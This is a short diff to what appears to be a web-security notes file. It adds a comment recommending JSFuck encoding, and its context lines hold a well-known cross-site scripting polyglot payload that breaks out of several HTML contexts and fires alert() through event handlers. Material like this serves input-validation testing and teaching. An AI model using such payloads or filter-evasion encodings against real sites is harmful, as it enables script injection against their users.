@@ -1,4 +1,5 @@
 # Remember to encode every single input!
+# Even with URL encoding AND/OR JsF**k: https://github.com/aemkei/jsfuck http://www.jsfuck.com/
 
 # Polyglot attack:
 /*-/*`/*\`/*"/**(/* */oNcLiCk=alert())//%0D%0A%0d%0a//</sTyLe/</TitLe/</tExtArEa/</sCRipT/--!>\x3csVg/<sVg/oNloAd=alErT()//>\x3e
